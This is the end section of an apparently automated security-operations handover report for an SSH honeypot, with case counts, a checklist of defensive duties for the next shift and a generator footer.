> **Report grouping:** 23 priority case(s) shown individually · 37 recon entry/entries in table (3 group(s) consolidating 20 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-31T05:44:11Z_
